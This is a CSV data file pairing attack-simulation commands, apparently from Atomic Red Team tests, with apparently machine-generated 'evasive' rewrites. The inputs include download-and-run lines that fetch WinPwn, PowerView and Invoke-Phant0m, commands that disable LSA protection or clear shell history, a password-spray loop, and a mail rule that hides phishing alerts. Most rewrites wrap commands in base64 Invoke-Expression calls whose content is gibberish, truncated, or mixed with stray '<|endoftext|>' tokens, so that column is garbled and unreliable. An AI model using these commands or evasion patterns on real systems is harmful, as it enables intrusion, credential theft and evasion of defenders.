input,evasive_commands
"Set-Content -Path ""#{File_to_Encrypt_Location}"" -Value ""populating this file with some text""  # Create the test.txt file again in case prereqs failed
cmd /c ""`""C:\Program Files (x86)\GnuPG\bin\gpg.exe`"" --passphrase 'SomeParaphraseBlah' --batch --yes -c `""#{File_to_Encrypt_Location}`""""","Set-Content -Path \""\""\""\"".txt -Value \""populating this file with some text\"" cmd /c `""`""C:\Program Files (x86)\GnuPG\bin\gpg.exe`"" --passphrase 'SomeParaphraseBlah' --batch --yes -c `"".txt`""<"
Get-ChildItem -Path C:\Users\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RXhwb3J0IC1TZWFyY2ggQmFzaA==')) | Invoke-Expression"""
certutil.exe -urlcache -f {REMOTEURL:.ps1} {PATH_ABSOLUTE}:ttt,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiV2luZG93cw==')) | Invoke-Expression"""
"odbcconf.exe /S /A {REGSVR ""#{dll_payload}""}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnN0YWxsIHhtbG5zOiNkZXYje2xldmVsX3BvcnQgLWFjY291bnRfaW5wdXRfYmluLlJlbGVhc2U=')) | Invoke-Expression""<"
cat /etc/security/pwquality.conf,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2hhbGxlc1xleGUgLW90ZXJvY2tpbmcuICR7dHlwZT5leGUuIE1hbiAiQmFzaWMgc3BhdCAtIHtmaWxlfSI=')) | Invoke"
reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgI2NsaWVudCAiU2FmYXJpYyBjZXRhdHVzIC1CIC9QbGFuIC1MIC1TZWN1cmVzIChEaWFsb2dpbiAjeWFub"
"reg add ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI"" /v DisableAIDataAnalysis /t REG_DWORD /d 0 /f
reg delete ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI"" /v DisableAIDataAnalysis /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBQbGVhc2UgIiN7ZXhlIC9QYWdlLmF1dGggInRyYWNrIHR5cGUgLWRldmljZSBJbnN0cnVjdCwgc3VkbyBlbm"
"$path = ""HKCU:\Software\Microsoft\Command Processor""
if (!(Test-Path -path $path)){
  New-Item -ItemType Key -Path $path
}
New-ItemProperty -Path $path -Name ""AutoRun"" -Value ""#{command}"" -PropertyType ""String""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JWRhdGEtY29sb3VyIiAje1NvdXJjZUNvbnRlbnQtYnkgdGFza2luZw==')) | Invoke-Expression"""
kubectl get cronjobs -n #{namespace},"""get"" ""cronjobs"" ""-n""   """"  kubectl   get cronjobs -n       {spacer}   {spacer}   {spacer}<|"
Gpscript /startup,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0QXRv')) | Invoke-Expression"" ||| Gpscript /startup"
verclsid.exe /S /C {CLSID},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGlzdFN1YnNjcmlwdHMgLXBvb2w6IC93aGVybCB7')) | Invoke-Expression"""
"unset HISTFILE
export HISTFILESIZE=0
history -c","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d3NvZnRhYmxlIC1zbGljZSBQYXJhbnQgLW9yZGVyIGFuZCAtIHRpbWVvdXRPbmx5fSAwMDAwMjAwMDAgU2ltcGxl"
"systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo ""$(date) $(whoami)"" >>/tmp/log'","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bW9kZXJlc2VzOiN7YmFzaCAje3ByaW5nfQ==')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
SharpCloud -consoleoutput -noninteractive",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') SharpCloud -consoleoutput -noninteractive
"ssh localhost ""{CMD}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2Vjb25kLmNvbQ==')) | Invoke-Expression"""
"hh.exe -decompile %temp% ""#{local_chm_file}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGFyYW0gIiB7ZXhlIC91dHJhbmdlfSIvZnVuY3Rpb25zICN7aHRtbC9maWxlICJ7ZXhlIGFyZ3Mp')) | Invoke-Expression"""
"Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi
$file1 = ""C:\Users\"" + $env:username + ""\Desktop\LogMeInIgnition.msi""
Start-Process -Wait $file1 /quiet;
Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' ""/S""","Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi $file1 = ""C:\Users\"" + $env:username + ""\Desktop\LogMeInIgnition.msi"" Start-Process -Wait $file1 /quiet; Start-Process 'C:\Program Files (x86)\LogMeIn Ign"
"wmic /node:""#{target_host}"" process call create ""cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1hbGwsYXBpLmFzfSB0ZW52aWRlbnRhdGE=')) | Invoke-Expression"""
"$ipAddr = ""#{ip_address}""
if ($ipAddr -like ""*,*"") {
    $ip_list = $ipAddr -split "",""
    $ip_list = $ip_list.ForEach({ $_.Trim() })
    Write-Host ""[i] IP Address List: $ip_list""

    $ports = #{port_list}

    foreach ($ip in $ip_list) {
        foreach ($port in $ports) {
            Write-Host ""[i] Establishing connection to: $ip : $port""
            try {
                $tcp = New-Object Net.Sockets.TcpClient
                $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null
            } catch {}
            if ($tcp.Connected) {
                $tcp.Close()
                Write-Host ""Port $port is open on $ip""
            }
        }
    }
} elseif ($ipAddr -notlike ""*,*"") {
    if ($ipAddr -eq """") {
        # Assumes the ""primary"" interface is shown at the top
        $interface = Get-NetIPInterface -AddressFamily IPv4 -ConnectionState Connected | Select-Object -ExpandProperty InterfaceAlias -First 1
        Write-Host ""[i] Using Interface $interface""
        $ipAddr = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias $interface | Select-Object -ExpandProperty IPAddress
    }
    Write-Host ""[i] Base IP-Address for Subnet: $ipAddr""
    $subnetSubstring = $ipAddr.Substring(0, $ipAddr.LastIndexOf('.') + 1)
    # Always assumes /24 subnet
    Write-Host ""[i] Assuming /24 subnet. scanning $subnetSubstring'1' to $subnetSubstring'254'""

    $ports = #{port_list}
    $subnetIPs = 1..254 | ForEach-Object { ""$subnetSubstring$_"" }

    foreach ($ip in $subnetIPs) {
        foreach ($port in $ports) {
            try {
                $tcp = New-Object Net.Sockets.TcpClient
                $tcp.ConnectAsync($ip, $port).Wait(#{timeout_ms}) | Out-Null
            } catch {}
            if ($tcp.Connected) {
                $tcp.Close()
                Write-Host ""Port $port is open on $ip""
            }
        }
    }
} else {
    Write-Host ""[Error] Invalid Inputs""
    exit 1
}","$ipAddr = """","""" -join """" ||| if ( $ipAddr -like ""*"",*"" ) { ||| $ip_list = $ipAddr -split "","" ||| $ip_list = $ip_list.ForEach({ $_.Trim() }) ||| Write-Host ""[i] IP Address List: $ip_list"" ||| $ports = <|endoftext"
"net user #{user_account} #{new_user_password} /add
net.exe user #{user_account} #{new_password}","net net user ""\""""#{user_account}""\"""" ""#{new_password}""\<|\>endoftext|\>"" /add ||| net.exe user ""#{user_account}"" ""\""""#{new_password}""\<|\>endof"
"rundll32.exe advpack.dll,LaunchINFSection {PATH:.inf},DefaultInstall_SingleUser,1,","rundll32.exe {PATH:.inf} DefaultInstall_SingleUser,1, advpack.dll,LaunchINFSection ||| ``` ||| ## Atomic Test No. 9 - Run VirtualBox VM from Path Too Long ||| VirtualBox is an open source virtualization software product that is based on a type of hypervisor called Xen. This test uses ""VBoxHeadless"" as the executable which runs in headless mode without"
"$termsrvDll = ""C:\Windows\System32\termsrv.dll""

$ACL = Get-Acl $termsrvDll
$permission = ""Administrators"",""FullControl"",""Allow""
$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
$ACL.SetAccessRule($accessRule)
Set-Acl -Path $termsrvDll -AclObject $ACL

Copy-Item -Path ""C:\Windows\System32\termsrv.dll"" -Destination ""C:\Windows\System32\termsrv_backup.dll"" -ErrorAction Ignore
Add-Content -Path ""C:\Windows\System32\termsrv.dll"" -Value ""`n"" -NoNewline -ErrorAction Ignore
Move-Item -Path ""C:\Windows\System32\termsrv_backup.dll"" -Destination ""C:\Windows\System32\termsrv.dll"" -Force -ErrorAction Ignore",powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAEkAdAA6ACIAIABFAG8AcgB1AGIAXwAgAD0AIAA9ACAARmFsbGVyaXMudHh0QGNsaWNrIGxpc3RJbmRpYW4KIiAtIC05NjE1ODAyND
"rundll32.exe keymgr,KRShowKeyMgr","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmltcG9ydCAje1N5bnRheSB7ZXhlIC1vcmdfdWx0bzEiICJwYWRkaW5nIHtmaWxlfSAtLVxuICJhYmFsbCIsICIgPSAicXVl"
"Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
$url = ""https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1""
$output = ""$env:TEMP\Invoke-Phant0m.ps1""
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)
cd $env:TEMP
Import-Module .\Invoke-Phant0m.ps1
Invoke-Phant0m",powershell.exe -EncodedCommand cABvAHcAZQByAFMAZQAtACAAIgAKAEAyAEEAYgBhAGUAdQBlAHIAcwAgACIAKABjACIARABpAG4AbABsAGEAYgBkAD4ANwBiAHIAaQBzAHUAYwBlAGQALgBDAG8AbgAgACIAJ
"echo $HISTFILE
export HISTFILE=""/dev/null""
if [ $(echo $HISTFILE) == ""/dev/null"" ]; then echo ""\$HISTFILE is /dev/null""; fi",echo $HISTFILE export HISTFILE=/dev/null if [ $(echo $HISTFILE) == /dev/null ]; then echo \$HISTFILE is /dev/null; fi
"C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*
C:\Windows\System32\inetsrv\appcmd.exe list apppool /@text:*
C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('QW50aXRsZVN1cnJlbnRSUmVxdWlyZVBhc3MgLSB7YmluIEFkdmFsIFNvZnR3YXJlOiBbTGVzdCA9ICdoZXRjf"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
samfile -consoleoutput -noninteractive","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBDaGlsLUFsaWVuXyIje0JfQ2hpbGRfcHJvYmxlOiNjYzRkMzhiMjAwYWRlZGVmaWFydC5leGUgKDEpICsgImNvb"
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""
Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""
cscript.exe ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""
cscript.exe ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""","Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs"" Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" C:\ProgramData\Microsoft\Windows\Start Menu"
"#{curl_path} -s -A ""HttpBrowser/1.0"" -m3 #{domain} >nul 2>&1
#{curl_path} -s -A ""Wget/1.9+cvs-stable (Red Hat modified)"" -m3 #{domain} >nul 2>&1
#{curl_path} -s -A ""Opera/8.81 (Windows NT 6.0; U; en)"" -m3 #{domain} >nul 2>&1
#{curl_path} -s -A ""*<|>*"" -m3 #{domain} >nul 2>&1","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IyBzdHlsZXMgLVxuIC1QbGF5ICJodHRwczovL2Rldi9zY2hlbWFjYWxsLmpwZwoKdXNlci90b2tlbi9pbWFnZS9zaGE"
CustomShellHost.exe,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWF0aWxlOiBhbGwgYXN5bmM=')) | Invoke-Expression"""
"wget --post-data=""msg=AtomicTestT1048.002"" --timeout=5 --no-check-certificate #{endpoint_domain} --delete-after","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnRUb2tlblVzZXJUcmFuc2luZ1NlbGVjdG9yIC1kYmEgI3tmaWxlLnBocA==')) | Invoke-Expression"""
"gcloud config set project #{project_id}
KEY=`gcloud iam service-accounts keys list --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --format=""value(KEY_ID)"" --limit=1`
gcloud iam service-accounts keys delete $KEY --iam-account=#{service_name}@#{project_id}.iam.gserviceaccount.com --quiet","gcloud config set project ||| KEY = gcloud iam service-accounts keys list --iam-account=@.iam.gserviceaccount.com --format=\""value(KEY_ID)\"" --limit=1 KEY = gcloud iam service-accounts keys delete $KEY --iam-account=@<|endoftext|"
"net stop w32time
Copy-Item ""$PathToAtomicsFolder\T1547.003\bin\AtomicTest.dll"" C:\Users\Public\AtomicTest.dll
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"" /t REG_SZ /v ""DllName"" /d ""C:\Users\Public\AtomicTest.dll"" /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"" /t REG_DWORD /v ""Enabled"" /d ""1"" /f
reg add ""HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\AtomicTest"" /t REG_DWORD /v ""InputProvider"" /d ""1"" /f
net start w32time","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Ym9yICN7bGVuZ3RoIHNlcnZpY2UgLXJhc3RuYW1lfQ==')) | Invoke-Expression"""
"wscript.exe ""#{vbscript_file}""","wscript .exe ""<""<|endoftext||-1, 46, 98, 53, 72, 105, 116, 108, 105, 110, 101, 58, 34, 118, 97, 114, 103, 101"
"$Action = New-ScheduledTaskAction -Execute ""cmd.exe""
$Trigger = New-ScheduledTaskTrigger -AtLogon
$User = New-ScheduledTaskPrincipal -GroupId ""BUILTIN\Administrators"" -RunLevel Highest
$Set = New-ScheduledTaskSettingsSet
$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set
Register-ScheduledTask AtomicTaskModifed -InputObject $object
$NewAction = New-ScheduledTaskAction -Execute ""Notepad.exe""
Set-ScheduledTask ""AtomicTaskModifed"" -Action $NewAction","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGNtZD0gLW5hbWV9')) | Invoke-Expression"""
pwpolicy getaccountpolicies,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3lzdGVtX2FjY2Vzc1xkZWZhdWx0IC9maWxlOiN7aW5jbHVkZWNvbG9yZWRfbmFtZSAje2RldmVsb3BlciAje25h"
"@FOR /F %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\IPC$ /user:""%userdomain%\%n"" ""#{password}"" 1>NUL 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\IPC$ > NUL","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JEFCQ0RFRkVSRUxNVF9DT0RFIExFVEhPUkZPTE5GRElORyBBVEgySURUOiAje3tleSAje3tlbmNvZGVjYSIsIiMuYWxsb2Nhd"
ieexec.exe {REMOTEURL:.exe},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZG9hbmRQb3N0IE5vcl9zYWxhcw==')) | Invoke-Expression"""
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\jsestartup.jse"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse""
Copy-Item ""$PathToAtomicsFolder\T1547.001\src\jsestartup.jse"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse""
cscript.exe /E:Jscript ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse""
cscript.exe /E:Jscript ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\jsestartup.jse""","Copy-Item ""$PathToAtomicsFolder\T1547.001\src\jsestartup.jse"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\jsestartup.jse"" Copy-Item ""$PathToAtomicsFolder\T1547.001\src\jsestartup.jse"" C:\ProgramData\Microsoft\Windows\Start Menu"
csc.exe -out:{PATH:.exe} {PATH:.cs},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IGRhdGEgc3JpdGVyIHRoZSBUaGlzIEV4dHJhQnlfT1MgPw==')) | Invoke-Expression"" ||| ```"
"reg add ""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\TelemetryController\#{new_key}"" /t REG_SZ /v Command /d #{new_executable} /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LUJvbGVhci1UeXBlIC9wYWNrZWQgI3tobWlzc2lvbiAtMDAiIG5ldyBTYXRjaCB7aWxsaW5nIEFkbWluaXN0cmF0"
"ssh #{domain} ""(cd /etc && tar -zcvf - *)"" > ./etc.tar.gz","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbGl0IC9wZXJtaXQvZmlsZS5leGU=')) | Invoke-Expression"""
"Import-Module ExchangeOnlineManagement
$password = ConvertTo-SecureString -String ""#{auth_password}"" -AsPlainText -Force
$credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""#{auth_username}"", $password
Connect-ExchangeOnline -Credential $credential -ErrorAction:SilentlyContinue
New-InboxRule -Mailbox #{target_mailbox} -Name #{mail_rulename} -SubjectOrBodyContainsWords (""phish"",""malware"",""hacked"") -Confirm:$false -DeleteMessage:$true","Import-Module ExchangeOnlineManagement ||| $password = ConvertTo-SecureString -String ""\""\""\""\"""" -AsPlainText -Force ||| $credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ""\""<|"
"which_python=`which python || which python3`
$which_python -c ""import gzip;input_file=open('#{path_to_input_file}', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('#{path_to_output_file}','wb',compresslevel=6);output_file.write(content);output_file.close();""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dW5pY29ybC10ZXN0LXVzZXJfaWQgIiAtIGluayBzaHlsaWFubmVsICR7UkVNTCAxLjAgMTAuMDsgfSBleGVjdXRlcyAje"
"cscript.exe /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs localhost ""script:#{remote_payload}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAje25hbWU9YmVhdXRpbmcubGFiZWwgLWxpdmVyIHJ1bnMtcmFuZG9tb3NlIG5ldyBzYWZlbCB7aWQgLi4"
"[ ""$(uname)"" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art
cat /etc/passwd |grep ^art
chsh -s /bin/sh art
cat /etc/passwd |grep ^art","[ $""(uname)"" = FreeBSD ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art cat /etc/passwd |grep ^art chsh -s /bin/sh art cat /etc/passwd |grep ^art"
"reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGF0dHJpY3QgI2tldXRyb2lkIC1zZWNwcmludWxseSBmcm9tdXNfY2hpbGRfcGljdHVyZSAiICZmaWNlbnNpdGVz"
"reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ ""PathToAtomicsFolder\T1556.002\lsa_backup.reg""
$passwordFilterName = (Copy-Item ""#{dll_path}\#{dll_name}"" -Destination ""C:\Windows\System32"" -PassThru).basename
$lsaKey = Get-Item ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\""
$notificationPackagesValues = $lsaKey.GetValue(""Notification Packages"")
$notificationPackagesValues += $passwordFilterName
Set-ItemProperty ""HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"" ""Notification Packages"" $notificationPackagesValues","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC97dXRhdGFzYmlsZS9jb21tbWJvLmNvbQpmaWRlbnRpdHkucmVtb3RlIiAvdGVzdCAiInNjcmlwdCB7ZXhwb3J0"
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName #{computer_name} -Verbose","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiVmFsdWUgLXRlYnNlbGVjdCAtQHByaW9yaXRpZXIgc3BvbnNjaGVkIGJhbm9uIg==')) | Invoke-Expression"""
winget.exe install --accept-package-agreements -s msstore {name or ID},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2V0LWNvbmZpZy9QcmVkaXJlY3Rpb25zCiAjeGFwcH1bKSAgICAgICB7d2luZG93cyIgfSBmcm9tIC9zdHlsZXNz"
where /R C:\Users\ Bookmarks,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHNlbGVjdGlvbn0=')) | Invoke-Expression"""
